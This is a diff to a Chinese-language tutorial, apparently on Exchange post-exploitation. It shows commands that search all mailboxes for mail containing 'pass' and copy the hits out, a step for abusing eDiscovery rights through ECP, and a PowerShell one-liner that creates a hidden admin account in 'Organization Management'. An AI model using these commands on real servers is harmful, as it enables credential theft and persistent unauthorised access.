@@ -345,7 +345,7 @@ DirectSearchMailfromExchange -MailBox "All" -Filter "*pass*" -TargetMailbox "tes
 ```
 
 
-### 补充：搜索邮件的常用命令
+### 补充1：搜索邮件的常用命令
 
 (1)枚举所有邮箱用户，显示包含关键词pass的邮件的数量
 
@@ -374,6 +374,23 @@ Get-Mailbox|Search-Mailbox -SearchQuery "*pass*" -TargetMailbox "test2" -TargetF
 ```
 Search-Mailbox -Identity test1 -SearchQuery "*pass*" -TargetMailbox "test2" -TargetFolder "out" -LogLevel Suppress
 ```
+
+### 补充2 通过ECP搜索邮件
+
+登录ecp，将当前用户加入`Discovery Management`组中
+
+刷新页面
+
+选择`compliance management`->`in-place eDiscovery & hold`
+
+具体操作细节可参考：https://docs.microsoft.com/en-us/exchange/security-and-compliance/in-place-ediscovery/in-place-ediscovery?redirectedfrom=MSDN#roles
+
+### 补充3 命令行下添加管理员用户
+
+```
+powershell -c "Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;$pwd=convertto-securestring Password123 -asplaintext -force;New-Mailbox -UserPrincipalName testuser1@test.com -OrganizationalUnit test.com/Users -Alias testuser1 -Name testuser1 -DisplayName testuser1 -Password $pwd;Add-RoleGroupMember \"Organization Management\" -Member testuser1 -BypassSecurityGroupManagerCheck"
+```
+
 
 ## 0x05 小结 
 ---
